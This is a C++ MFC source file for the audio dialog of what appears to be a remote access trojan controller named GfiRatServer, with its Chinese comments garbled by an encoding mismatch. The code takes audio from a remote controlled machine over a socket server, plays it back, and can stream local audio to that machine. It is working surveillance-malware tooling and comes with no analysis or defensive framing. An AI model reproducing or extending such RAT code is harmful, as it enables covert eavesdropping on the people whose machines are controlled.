// AudioDlg.cpp : ʵ���ļ�
//

#include "pch.h"
#include "GfiRatServer.h"
#include "AudioDlg.h"
#include "afxdialogex.h"


// CAudioDlg �Ի���

IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)

CAudioDlg::CAudioDlg(CWnd* pParent, CIOCPServer* IOCPServer, ClientContext* ContextObject)
	: CDialog(CAudioDlg::IDD, pParent)
	, m_bSend(FALSE)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_AUDIO));  //����ͼ��
	m_bIsWorking = TRUE;
	m_bThreadRun = FALSE;
	m_iocpServer = IOCPServer;       //Ϊ��ĳ�Ա������ֵ
	m_ContextObject = ContextObject;
	m_hWorkThread = NULL;
	m_nTotalRecvBytes = 0;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));        //�õ����ض�ip
	int iClientAddressLen = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->m_Socket, (SOCKADDR*)&ClientAddress, &iClientAddressLen);

	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";
}

CAudioDlg::~CAudioDlg()
{
	m_bIsWorking = FALSE;
	while (m_bThreadRun)
		Sleep(50);
}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Check(pDX, IDC_SEND_LOCALAUDIO, m_bSend);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_SEND_LOCALAUDIO, &CAudioDlg::OnBnClickedCheck)

END_MESSAGE_MAP()


// CAudioDlg ��Ϣ��������


BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, FALSE);

	CString strString;
	strString.Format("%s - ��������", m_strIPAddress);
	SetWindowText(strString);

	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));

	//�����߳� �ж�CheckBox
	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	m_bThreadRun = m_hWorkThread ? TRUE : FALSE;

	// "���ͱ�������"�ᵼ�±��������"OnBnClickedCheck"
	//GetDlgItem(IDC_SEND_LOCALAUDIO)->EnableWindow(FALSE);

	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


DWORD  CAudioDlg::WorkThread(LPVOID lParam)
{
	CAudioDlg* This = (CAudioDlg*)lParam;

	while (This->m_bIsWorking&& This->m_iocpServer->IsRunning())
	{
		if (!This->m_bSend)
		{
			WAIT(This->m_bIsWorking, 1, 50);
			continue;
		}
		DWORD	dwBufferSize = 0;
		LPBYTE	szBuffer = This->m_AudioObject.GetRecordBuffer(&dwBufferSize);   //��������

		if (szBuffer != NULL && dwBufferSize > 0)
			This->m_iocpServer->Send(This->m_ContextObject, szBuffer, dwBufferSize); //û����Ϣͷ
	}
	This->m_bThreadRun = FALSE;
	return 0;
}

void CAudioDlg::OnReceiveComplete(void)
{
	m_nTotalRecvBytes += m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1;   //1000+ =1000 1
	CString	strString;
	strString.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, strString);
	switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:
	{
		m_AudioObject.PlayBuffer(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1),
			m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1);   //���Ų�������
		break;
	}

	default:
		// ���䷢���쳣����
		break;
	}
}

void CAudioDlg::OnClose()
{
	// TODO: �ڴ�������Ϣ������������/�����Ĭ��ֵ

	CancelIo((HANDLE)m_ContextObject->m_Socket);
	closesocket(m_ContextObject->m_Socket);

	m_bIsWorking = FALSE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CDialog::OnClose();

}

// �����Ƿ��ͱ���������Զ��
void CAudioDlg::OnBnClickedCheck()
{
	// @notice 2019.1.26
	// �������"���ͱ�������"���򱻿ض˱�����zlib inffas32.asm
	// �轫���ض�zlib���������ض����±���
	// ���Ǽ�ʹ���������ض��ڿ���"���ͱ�������"ʱ���ױ���
	// �����������ڲ���Զ������ʱ�����������ԭ����
	UpdateData(true);
}

void CAudioDlg::OnReceive()
{

}
